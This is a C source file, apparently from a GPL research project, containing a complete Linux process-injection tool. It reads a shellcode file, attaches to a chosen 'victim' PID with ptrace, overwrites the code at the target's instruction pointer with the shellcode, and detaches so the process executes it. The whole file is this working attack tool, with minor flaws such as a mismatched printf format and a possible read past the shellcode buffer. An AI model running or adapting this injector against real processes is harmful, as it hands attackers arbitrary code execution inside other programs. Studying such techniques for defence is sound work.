/*
 * This file is part of the linux-prinj project.
 * https://gitlab.com/pgregoire/linux-prinj/
 *
 * Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>


/*
 * Reads a file into @buf, settings its length in @len.
 */
static int rdfile(const char* path, unsigned char** buf, size_t* len)
{
	int e;
	int fd;
	void* t;
	struct stat st;


	if (0 > stat(path, &st)) {
		return -1;
	}

	if (0 > (fd = open(path, O_RDONLY))) {
		return -1;
	}

	if (0 != (t = malloc(st.st_size))) {
		if (st.st_size == read(fd, t, st.st_size)) {
			close(fd);
			*buf = t;
			*len = st.st_size;
			return 0;
		}
	}

	e = errno;
	free(t);
	close(fd);
	errno = e;

	return -1;
}

/*
 * Writes the @len bytes in @buf at @addr in @pid's address space.
 */
static int
wr2mem(pid_t pid, unsigned long addr, const unsigned char* buf, size_t len)
{
	size_t i;
	unsigned long v;

	for (i = 0 ; i < len ; /**/) {
		v = ((unsigned long*)buf)[i/sizeof(unsigned long)];
		printf("Writing %016llx at 0x%016llx\n", v, addr);
		if (0 != ptrace(PTRACE_POKETEXT, pid, addr, v)) {
			return -1;
		}

		i += sizeof(unsigned long);
		addr += sizeof(unsigned long);
	}

	return 0;
}

int main(int argc, const char* const* argv)
{
	pid_t pid;
	size_t len;
	unsigned char* buf;
	struct user_regs_struct regs;


	if (3 != argc) {
		fprintf(stderr, "usage: inject <shellcode.file> <victim-pid>\n");
		return 1;
	}

	if (0 != rdfile(argv[1], &buf, &len)) {
		perror("Failed to read shellcode file");
		return 1;
	}

	pid = atoi(argv[2]);

	if (0 != ptrace(PTRACE_ATTACH, pid, 0, 0)) {
		perror("Failed to attach to target process");
		return 1;
	}

	/* Wait for the process to be stopped (under our control). */
	if (pid != waitpid(pid, 0, 0)) {
		perror("Failed waiting for target process");
		return 1;
	}

	/* Get the target process's current registers. */
	if (0 != ptrace(PTRACE_GETREGS, pid, 0, &regs)) {
		perror("Failed to read registers");
		return 1;
	}

	/*
         * The victim program mainly blocks on a syscall (sleep). 
	 * syscall's opcode is 2 bytes long so overwrite the
	 * code executed on its return.
	 */
	regs.rip += 2;
	if (0 != wr2mem(pid, regs.rip, buf, len)) {
		perror("Failed to write shellcode to memory");
		return 1;
	}

	/* Let the target process execute normally. */
	if (0 != ptrace(PTRACE_DETACH, pid, 0, 0)) {
		perror("Failed to detach process");
		return 1;
	}

	return 0;
}
